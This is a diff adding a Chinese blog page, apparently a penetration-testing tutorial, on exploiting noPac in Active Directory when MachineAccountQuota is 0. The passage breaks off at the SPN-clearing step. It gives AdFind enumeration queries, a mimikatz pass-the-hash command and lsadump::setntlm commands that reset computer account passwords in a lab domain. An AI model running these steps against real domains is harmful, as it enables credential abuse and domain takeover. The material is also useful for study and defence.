@@ -1,0 +1,294 @@
+<!DOCTYPE html>
+<html itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+  <head>
+    
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+    <meta name="robots" content="noodp" />
+    <title>noPac MAQ = 0 的突破 - TryA9ain-Blog</title><meta name="author" content="TryA9ain">
+<meta name="author-link" content="">
+<meta name="description" content="本文主要记录了当 MAQ = 0 时, noPac 的利用姿势." /><meta name="keywords" content='域渗透' /><meta itemprop="name" content="noPac MAQ = 0 的突破">
+<meta itemprop="description" content="本文主要记录了当 MAQ = 0 时, noPac 的利用姿势."><meta itemprop="datePublished" content="2023-02-03T13:37:22+08:00" />
+<meta itemprop="dateModified" content="2023-02-03T13:37:22+08:00" />
+<meta itemprop="wordCount" content="1608">
+<meta itemprop="keywords" content="域渗透," /><meta property="og:title" content="noPac MAQ = 0 的突破" />
+<meta property="og:description" content="本文主要记录了当 MAQ = 0 时, noPac 的利用姿势." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://TryA9ain.github.io/posts/maq-0-%E7%9A%84%E7%AA%81%E7%A0%B4/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2023-02-03T13:37:22+08:00" />
+<meta property="article:modified_time" content="2023-02-03T13:37:22+08:00" />
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="noPac MAQ = 0 的突破"/>
+<meta name="twitter:description" content="本文主要记录了当 MAQ = 0 时, noPac 的利用姿势."/>
+<meta name="application-name" content="FixIt">
+<meta name="apple-mobile-web-app-title" content="FixIt"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="https://TryA9ain.github.io/posts/maq-0-%E7%9A%84%E7%AA%81%E7%A0%B4/" /><link rel="prev" href="https://TryA9ain.github.io/posts/%E5%88%A9%E7%94%A8-keytab-%E5%92%8C-wireshark-%E8%A7%A3%E5%AF%86-kerberos/" /><link rel="next" href="https://TryA9ain.github.io/posts/%E9%80%9A%E8%BF%87-kerberos-pre-authentication-%E8%BF%9B%E8%A1%8C%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE%E5%92%8C%E5%8F%A3%E4%BB%A4%E7%88%86%E7%A0%B4/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
+  {
+    "@context": "http://schema.org",
+    "@type": "BlogPosting",
+    "headline": "noPac MAQ = 0 的突破",
+    "inLanguage": "zh-CN",
+    "mainEntityOfPage": {
+      "@type": "WebPage",
+      "@id": "https:\/\/TryA9ain.github.io\/posts\/maq-0-%E7%9A%84%E7%AA%81%E7%A0%B4\/"
+    },"genre": "posts","keywords": "域渗透","wordcount":  1608 ,
+    "url": "https:\/\/TryA9ain.github.io\/posts\/maq-0-%E7%9A%84%E7%AA%81%E7%A0%B4\/","datePublished": "2023-02-03T13:37:22+08:00","dateModified": "2023-02-03T13:37:22+08:00","publisher": {
+      "@type": "Organization",
+      "name": ""},"author": {
+        "@type": "Person",
+        "name": "TryA9ain"
+      },"description": ""
+  }
+  </script></head>
+  <body data-header-desktop="sticky" data-header-mobile="auto"><script>(window.localStorage?.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('data-theme', 'dark');</script><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
+  <div class="header-wrapper">
+    <div class="header-title">
+      <a href="/" title="TryA9ain-Blog"><span class="header-title-text">TryA9ain</span></a><span class="header-subtitle"></span></div>
+    <nav>
+      <ul class="menu"><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/posts/"
+                
+                
+              >文章</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/categories/"
+                
+                
+              >分类</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/tags/"
+                
+                
+              >标签</a></li><li class="menu-item delimiter"></li><li class="menu-item theme-switch" title="切换主题">
+          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+        </li></ul>
+    </nav>
+  </div>
+</header><header class="mobile animate__faster" id="header-mobile">
+  <div class="header-container">
+    <div class="header-wrapper">
+      <div class="header-title">
+        <a href="/" title="TryA9ain-Blog"><span class="header-title-text">TryA9ain</span></a><span class="header-subtitle"></span></div>
+      <div class="menu-toggle" id="menu-toggle-mobile">
+        <span></span><span></span><span></span>
+      </div>
+    </div>
+    <nav>
+      <ul class="menu" id="menu-mobile"><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/posts/"
+                  
+                  
+                >文章</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/categories/"
+                  
+                  
+                >分类</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/tags/"
+                  
+                  
+                >标签</a></li><li class="menu-item menu-system">
+          <span class="menu-system-item theme-switch" title="切换主题"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></span></li>
+      </ul>
+    </nav>
+  </div>
+</header><main class="container"><aside class="toc" id="toc-auto"><h2 class="toc-title">目录&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
+      <div class="toc-content" id="toc-content-auto"></div></aside>
+
+  <aside class="aside-custom">
+    </aside>
+
+  <article class="page single">
+    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span>noPac MAQ = 0 的突破</span>
+      </h1></div><div class="post-meta">
+      <div class="post-meta-line"><span class="post-author"><span class="author"><img loading="lazy" src="/images/logo.jpeg" srcset="/images/logo.jpeg, /images/logo.jpeg 1.5x, /images/logo.jpeg 2x" sizes="auto" data-title="TryA9ain" data-alt="TryA9ain" class="avatar" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/>&nbsp;TryA9ain</span></span>
+          <span class="post-category">收录于 <a href="/categories/%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86/"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> 域渗透相关知识</a></span></div>
+      <div class="post-meta-line"><span title="发布于 2023-02-03 13:37:22"><i class="fa-regular fa-calendar-alt fa-fw me-1" aria-hidden="true"></i><time datetime="2023-02-03">2023-02-03</time></span>&nbsp;<span title="更新于 2023-02-03 13:37:22"><i class="fa-regular fa-edit fa-fw me-1" aria-hidden="true"></i><time datetime="2023-02-03">2023-02-03</time></span>&nbsp;<span><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>约 1608 字</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>预计阅读 4 分钟</span>&nbsp;</div>
+    </div><div class="details toc" id="toc-static" data-kept="false">
+        <div class="details-summary toc-title">
+          <span>目录</span>
+          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
+        </div>
+        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#ms-ds-machine-account-quota">MS-DS-Machine-Account-Quota</a></li>
+    <li><a href="#利用过程">利用过程</a>
+      <ul>
+        <li><a href="#查询每个域机器是由哪个域用户拉入域的">查询每个域机器是由哪个域用户拉入域的</a></li>
+        <li><a href="#模拟用户身份">模拟用户身份</a></li>
+        <li><a href="#查看计算机帐户的-spn-信息">查看计算机帐户的 SPN 信息</a></li>
+        <li><a href="#更改计算机帐户的密码">更改计算机帐户的密码</a></li>
+        <li><a href="#清除计算机帐户的-spn">清除计算机帐户的 SPN</a></li>
+        <li><a href="#更改计算机帐户的-samaccountname">更改计算机帐户的 sAMAccountName</a></li>
+        <li><a href="#通过计算机帐户申请-tgt">通过计算机帐户申请 TGT</a></li>
+        <li><a href="#恢复计算机帐户的-samaccountname">恢复计算机帐户的 sAMAccountName</a></li>
+        <li><a href="#获取-st">获取 ST</a></li>
+        <li><a href="#dcsync">DCSync</a></li>
+        <li><a href="#恢复计算机帐户的-spn-信息">恢复计算机帐户的 SPN 信息</a></li>
+        <li><a href="#恢复计算机帐户的历史-hash">恢复计算机帐户的历史 Hash</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+      </div><div class="content" id="content"><p>本文主要记录了当 MAQ = 0 时, noPac 的利用姿势.</p>
+<h2 id="ms-ds-machine-account-quota">MS-DS-Machine-Account-Quota</h2>
+<p>MAQ (MS-DS-Machine-Account-Quota), 此属性为: 允许域用户在域中创建的计算机帐户数量, 当 MAQ = 0 时便不能创建计算机帐户.</p>
+<p>这里有两种方法突破 MAQ = 0 的限制:</p>
+<ol>
+<li>
+<p>拿到 &ldquo;将计算机拉入域中的帐户&rdquo; 的权限.</p>
+</li>
+<li>
+<p>拿到具有 &ldquo;SeMachineAccountPrivilege&rdquo; 权限的帐户.</p>
+</li>
+</ol>
+<p>先解释一下第一种方法:</p>
+<ul>
+<li>将计算机拉入域中的帐户默认便对该计算机帐户有 WriteProperty 权限, 计算机帐户中的 mS-DS-CreatorSID 这个属性的 SID 就是拉它入域的 <strong>用户 SID</strong>, 那么便可以去查找域内存在 mS-DS-CreatorSID 的计算机帐户, 然后对应找到域用户帐户, 在拿到其权限后便可修改对应的计算机帐户属性, 从而实现该漏洞的利用.</li>
+</ul>
+<p>再来解释下第二种方法:</p>
+<ul>
+<li>有的企业会设置专门用来 <strong>加入域的组</strong> (这个组中的这些帐户都能用来将计算机拉入域中) 或者 <strong>帐户</strong>, 这些帐户具有 SeMachineAccountPrivilege 权限 (&ldquo;将工作站添加到域&rdquo; 属性), 后续可以重点留意下这些帐户, 默认 Authenticater Users (身份验证的用户) 具备 SeMachineAccountPrivilege.</li>
+</ul>
+<p>gpmc.msc 打开 &ldquo;组策略管理&rdquo;.</p>
+<p><img loading="lazy" src="images/Pasted%20image%2020230201111609.png" srcset="/posts/maq-0-%E7%9A%84%E7%AA%81%E7%A0%B4/images/Pasted%20image%2020230201111609.png, images/Pasted%20image%2020230201111609.png 1.5x, /posts/maq-0-%E7%9A%84%E7%AA%81%E7%A0%B4/images/Pasted%20image%2020230201111609.png 2x" sizes="auto" data-title="/posts/maq-0-%E7%9A%84%E7%AA%81%E7%A0%B4/images/Pasted%20image%2020230201111609.png" data-alt="/posts/maq-0-%E7%9A%84%E7%AA%81%E7%A0%B4/images/Pasted%20image%2020230201111609.png" width="1524" height="1072" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
+<p>计算机配置 &ndash;&gt; 策略 &ndash;&gt; Windows 设置 &ndash;&gt; 安全设置 &ndash;&gt; 本地策略 &ndash;&gt; 用户权限分配 &ndash;&gt; 将工作站添加到域.</p>
+<p><img loading="lazy" src="images/Pasted%20image%2020230201111711.png" srcset="/posts/maq-0-%E7%9A%84%E7%AA%81%E7%A0%B4/images/Pasted%20image%2020230201111711.png, images/Pasted%20image%2020230201111711.png 1.5x, /posts/maq-0-%E7%9A%84%E7%AA%81%E7%A0%B4/images/Pasted%20image%2020230201111711.png 2x" sizes="auto" data-title="/posts/maq-0-%E7%9A%84%E7%AA%81%E7%A0%B4/images/Pasted%20image%2020230201111711.png" data-alt="/posts/maq-0-%E7%9A%84%E7%AA%81%E7%A0%B4/images/Pasted%20image%2020230201111711.png" width="1586" height="1134" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
+<p><img loading="lazy" src="images/Pasted%20image%2020230201112035.png" srcset="/posts/maq-0-%E7%9A%84%E7%AA%81%E7%A0%B4/images/Pasted%20image%2020230201112035.png, images/Pasted%20image%2020230201112035.png 1.5x, /posts/maq-0-%E7%9A%84%E7%AA%81%E7%A0%B4/images/Pasted%20image%2020230201112035.png 2x" sizes="auto" data-title="/posts/maq-0-%E7%9A%84%E7%AA%81%E7%A0%B4/images/Pasted%20image%2020230201112035.png" data-alt="/posts/maq-0-%E7%9A%84%E7%AA%81%E7%A0%B4/images/Pasted%20image%2020230201112035.png" width="496" height="649" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
+<p>一旦我们拿到这些域用户帐户的权限, 就可以对其拉入域中的计算机帐户进行操作, 从而绕过 MAQ = 0 的限制, 达到我们利用漏洞的目的.</p>
+<h2 id="利用过程">利用过程</h2>
+<h3 id="查询每个域机器是由哪个域用户拉入域的">查询每个域机器是由哪个域用户拉入域的</h3>
+<p>通过 mS-DS-CreatorSID 来判断哪些机器是由哪些域用户的拉进域内的.</p>
+<blockquote>
+<p>如果一个计算机帐户没有 mS-DS-CreatorSID, 那么他是被域管拉入到域内的.</p>
+</blockquote>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">AdFind</span><span class="p">.</span><span class="py">exe</span> <span class="n">-h</span> <span class="mf">192.168</span><span class="p">.</span><span class="py">1</span><span class="p">.</span><span class="py">2</span> <span class="n">-u</span> <span class="n">ligang</span> <span class="n">-up</span> <span class="n">ligang</span> <span class="n">-b</span> <span class="s2">&#34;DC=missyou, DC=com&#34;</span> <span class="o">-f</span> <span class="s2">&#34;objectClass=computer&#34;</span> <span class="nb">mS-DS</span><span class="n">-CreatorSID</span>
+</span></span></code></pre></div><p><img loading="lazy" src="images/Pasted%20image%2020220920171459.png" srcset="/posts/maq-0-%E7%9A%84%E7%AA%81%E7%A0%B4/images/Pasted%20image%2020220920171459.png, images/Pasted%20image%2020220920171459.png 1.5x, /posts/maq-0-%E7%9A%84%E7%AA%81%E7%A0%B4/images/Pasted%20image%2020220920171459.png 2x" sizes="auto" data-title="/posts/maq-0-%E7%9A%84%E7%AA%81%E7%A0%B4/images/Pasted%20image%2020220920171459.png" data-alt="/posts/maq-0-%E7%9A%84%E7%AA%81%E7%A0%B4/images/Pasted%20image%2020220920171459.png" width="1284" height="890" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
+<p>查看 <code>S-1-5-21-3168693938-3984985196-3138901273-1105</code> 是谁.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">AdFind</span><span class="p">.</span><span class="py">exe</span> <span class="n">-b</span> <span class="s2">&#34;DC=missyou, DC=com&#34;</span> <span class="o">-f</span> <span class="s2">&#34;(&amp;(objectsid=S-1-5-21-3168693938-3984985196-3138901273-1105))&#34;</span> <span class="n">objectclass</span> <span class="n">cn</span> <span class="n">dn</span>
+</span></span></code></pre></div><p><img loading="lazy" src="images/Pasted%20image%2020220920171756.png" srcset="/posts/maq-0-%E7%9A%84%E7%AA%81%E7%A0%B4/images/Pasted%20image%2020220920171756.png, images/Pasted%20image%2020220920171756.png 1.5x, /posts/maq-0-%E7%9A%84%E7%AA%81%E7%A0%B4/images/Pasted%20image%2020220920171756.png 2x" sizes="auto" data-title="/posts/maq-0-%E7%9A%84%E7%AA%81%E7%A0%B4/images/Pasted%20image%2020220920171756.png" data-alt="/posts/maq-0-%E7%9A%84%E7%AA%81%E7%A0%B4/images/Pasted%20image%2020220920171756.png" width="1284" height="552" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
+<p>同样可以通过用户的 SID 查看哪些域机器是通过该用户加入到域内的：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-PowerShell" data-lang="PowerShell"><span class="line"><span class="cl"><span class="nb">Import-Module</span> <span class="p">.\</span><span class="n">PowerView</span><span class="p">.</span><span class="py">ps1</span>
+</span></span><span class="line"><span class="cl"><span class="nb">ConvertTo-SID</span> <span class="s2">&#34;missyou\wangxiaohong&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">AdFind</span><span class="p">.</span><span class="py">exe</span> <span class="n">-b</span> <span class="s2">&#34;DC=missyou, DC=com&#34;</span> <span class="o">-f</span> <span class="s2">&#34;(&amp;(samAccountType=805306369)(mS-DS-CreatorSID=S-1-5-21-3168693938-3984985196-3138901273-1105))&#34;</span> <span class="n">cn</span> <span class="n">sAMAccountType</span> <span class="n">objectCategory</span>
+</span></span></code></pre></div><p><img loading="lazy" src="images/Pasted%20image%2020220920172024.png" srcset="/posts/maq-0-%E7%9A%84%E7%AA%81%E7%A0%B4/images/Pasted%20image%2020220920172024.png, images/Pasted%20image%2020220920172024.png 1.5x, /posts/maq-0-%E7%9A%84%E7%AA%81%E7%A0%B4/images/Pasted%20image%2020220920172024.png 2x" sizes="auto" data-title="/posts/maq-0-%E7%9A%84%E7%AA%81%E7%A0%B4/images/Pasted%20image%2020220920172024.png" data-alt="/posts/maq-0-%E7%9A%84%E7%AA%81%E7%A0%B4/images/Pasted%20image%2020220920172024.png" width="1284" height="612" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
+<h3 id="模拟用户身份">模拟用户身份</h3>
+<p>此时假设我们通过其他手段已经拿到了 wangxiaohong 的密码.</p>
+<p><img loading="lazy" src="images/Pasted%20image%2020220920172620.png" srcset="/posts/maq-0-%E7%9A%84%E7%AA%81%E7%A0%B4/images/Pasted%20image%2020220920172620.png, images/Pasted%20image%2020220920172620.png 1.5x, /posts/maq-0-%E7%9A%84%E7%AA%81%E7%A0%B4/images/Pasted%20image%2020220920172620.png 2x" sizes="auto" data-title="/posts/maq-0-%E7%9A%84%E7%AA%81%E7%A0%B4/images/Pasted%20image%2020220920172620.png" data-alt="/posts/maq-0-%E7%9A%84%E7%AA%81%E7%A0%B4/images/Pasted%20image%2020220920172620.png" width="1280" height="1094" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
+<p>如果拿到的是明文密码, 直接使用 runas 或者其他方式即可, 如果拿到的是 Hash 且解不开可用 mimikatz 的 hash 注入来模拟 wangxiaohong 身份 (Hash 注入需要 privilege::debug 权限).</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">mimikatz</span> <span class="c"># privilege::debug</span>
+</span></span><span class="line"><span class="cl"><span class="n">mimikatz</span> <span class="c"># sekurlsa::pth /user:wangxiaohong /domain:missyou.com /ntlm:68839665b6fc20e8b8239f9682623102</span>
+</span></span></code></pre></div><h3 id="查看计算机帐户的-spn-信息">查看计算机帐户的 SPN 信息</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">setspn</span> <span class="n">-L</span> <span class="n">WIN</span><span class="p">-</span><span class="n">2008R2</span><span class="p">-</span><span class="mf">2</span><span class="p">$</span>
+</span></span></code></pre></div><p><img loading="lazy" src="images/Pasted%20image%2020220920173758.png" srcset="/posts/maq-0-%E7%9A%84%E7%AA%81%E7%A0%B4/images/Pasted%20image%2020220920173758.png, images/Pasted%20image%2020220920173758.png 1.5x, /posts/maq-0-%E7%9A%84%E7%AA%81%E7%A0%B4/images/Pasted%20image%2020220920173758.png 2x" sizes="auto" data-title="/posts/maq-0-%E7%9A%84%E7%AA%81%E7%A0%B4/images/Pasted%20image%2020220920173758.png" data-alt="/posts/maq-0-%E7%9A%84%E7%AA%81%E7%A0%B4/images/Pasted%20image%2020220920173758.png" width="1278" height="354" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
+<h3 id="更改计算机帐户的密码">更改计算机帐户的密码</h3>
+<p>由于我们并不知道计算机帐户的密码, 所以我们更改计算机帐户的密码 (通常情况下我们都不知道计算机帐户的密码或 Hash). Windows Server 2008 的域控好像不记录历史 Hash, 目前碰到的环境 Windows Server 2008 并无历史 Hash, 后续碰到在看, 不知道是不是当前环境同步的问题.</p>
+<blockquote>
+<p>为了避免修改密码后出现潜在的问题, 当我们 DCSync 获取到域管权限后, 将其恢复.</p>
+</blockquote>
+<p>可以通过 MS-SAMR 协议来修改计算机帐户的密码, 此处利用 Mimikatz.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">mimikatz</span> <span class="c"># lsadump::setntlm /server:DC /user:WIN-2008R2-2$ /password:1234</span>
+</span></span></code></pre></div><p><img loading="lazy" src="images/Pasted%20image%2020220921161543.png" srcset="/posts/maq-0-%E7%9A%84%E7%AA%81%E7%A0%B4/images/Pasted%20image%2020220921161543.png, images/Pasted%20image%2020220921161543.png 1.5x, /posts/maq-0-%E7%9A%84%E7%AA%81%E7%A0%B4/images/Pasted%20image%2020220921161543.png 2x" sizes="auto" data-title="/posts/maq-0-%E7%9A%84%E7%AA%81%E7%A0%B4/images/Pasted%20image%2020220921161543.png" data-alt="/posts/maq-0-%E7%9A%84%E7%AA%81%E7%A0%B4/images/Pasted%20image%2020220921161543.png" width="1180" height="254" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
+<hr>
+<p><strong>这里有一个问题</strong>:</p>
+<blockquote>
+<p>只是针对此处通过 MS-SAMR 协议更改密码后会出现的问题, 在其他情况下通过 MS-SAMR 协议更改密码不知道是否存在同样问题.</p>
+</blockquote>
+<p>通过 MS-SAMR 协议更改了计算机帐户的密码的话, 这将导致对应的计算机帐户在 <strong>活动目录</strong> 中的密码和在 <strong>本地注册表</strong> 以及 <strong>lsass 进程中</strong> 的密码不一致, 在恢复历史密码之前, 这台机器就登陆不了域了, 会提示 &ldquo;此工作站和主域间的信任关系失败&rdquo;.</p>
+<p><img loading="lazy" src="images/Pasted%20image%2020230111151413.png" srcset="/posts/maq-0-%E7%9A%84%E7%AA%81%E7%A0%B4/images/Pasted%20image%2020230111151413.png, images/Pasted%20image%2020230111151413.png 1.5x, /posts/maq-0-%E7%9A%84%E7%AA%81%E7%A0%B4/images/Pasted%20image%2020230111151413.png 2x" sizes="auto" data-title="/posts/maq-0-%E7%9A%84%E7%AA%81%E7%A0%B4/images/Pasted%20image%2020230111151413.png" data-alt="/posts/maq-0-%E7%9A%84%E7%AA%81%E7%A0%B4/images/Pasted%20image%2020230111151413.png" width="658" height="356" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
+<p>Win-2008$ 在活动目录中的 Hash:</p>
+<p><img loading="lazy" src="images/Pasted%20image%2020230203101702.png" srcset="/posts/maq-0-%E7%9A%84%E7%AA%81%E7%A0%B4/images/Pasted%20image%2020230203101702.png, images/Pasted%20image%2020230203101702.png 1.5x, /posts/maq-0-%E7%9A%84%E7%AA%81%E7%A0%B4/images/Pasted%20image%2020230203101702.png 2x" sizes="auto" data-title="/posts/maq-0-%E7%9A%84%E7%AA%81%E7%A0%B4/images/Pasted%20image%2020230203101702.png" data-alt="/posts/maq-0-%E7%9A%84%E7%AA%81%E7%A0%B4/images/Pasted%20image%2020230203101702.png" width="1096" height="76" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
+<p>Win-2008$ 在 lsass 进程中的 Hash:</p>
+<p><img loading="lazy" src="images/Pasted%20image%2020230203101801.png" srcset="/posts/maq-0-%E7%9A%84%E7%AA%81%E7%A0%B4/images/Pasted%20image%2020230203101801.png, images/Pasted%20image%2020230203101801.png 1.5x, /posts/maq-0-%E7%9A%84%E7%AA%81%E7%A0%B4/images/Pasted%20image%2020230203101801.png 2x" sizes="auto" data-title="/posts/maq-0-%E7%9A%84%E7%AA%81%E7%A0%B4/images/Pasted%20image%2020230203101801.png" data-alt="/posts/maq-0-%E7%9A%84%E7%AA%81%E7%A0%B4/images/Pasted%20image%2020230203101801.png" width="914" height="112" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
+<p>直至恢复历史的密码后才能继续登陆域内.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-PowerShell" data-lang="PowerShell"><span class="line"><span class="cl"><span class="n">lsadump</span><span class="p">::</span><span class="n">setntlm</span> <span class="p">/</span><span class="n">server</span><span class="err">:</span><span class="n">DC</span> <span class="p">/</span><span class="n">user</span><span class="err">:</span><span class="n">web</span><span class="p">$</span> <span class="p">/</span><span class="n">ntlm</span><span class="err">:</span><span class="n">524b61e4bcae961ce4ff67eb4739ad83</span>
+</span></span></code></pre></div><p><img loading="lazy" src="images/Pasted%20image%2020230203102425.png" srcset="/posts/maq-0-%E7%9A%84%E7%AA%81%E7%A0%B4/images/Pasted%20image%2020230203102425.png, images/Pasted%20image%2020230203102425.png 1.5x, /posts/maq-0-%E7%9A%84%E7%AA%81%E7%A0%B4/images/Pasted%20image%2020230203102425.png 2x" sizes="auto" data-title="/posts/maq-0-%E7%9A%84%E7%AA%81%E7%A0%B4/images/Pasted%20image%2020230203102425.png" data-alt="/posts/maq-0-%E7%9A%84%E7%AA%81%E7%A0%B4/images/Pasted%20image%2020230203102425.png" width="1922" height="366" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
+<p>所以通过 MS-SAMR 协议更改密码这种操作还是有风险的, 但是在没有更好的办法时, 也算是一种可行的方法吧.</p>
+<h3 id="清除计算机帐户的-spn">清除计算机帐户的 SPN</h3>
+<p>使用 PowerView.ps1 清空计算机帐户的 SPN 信息</p>
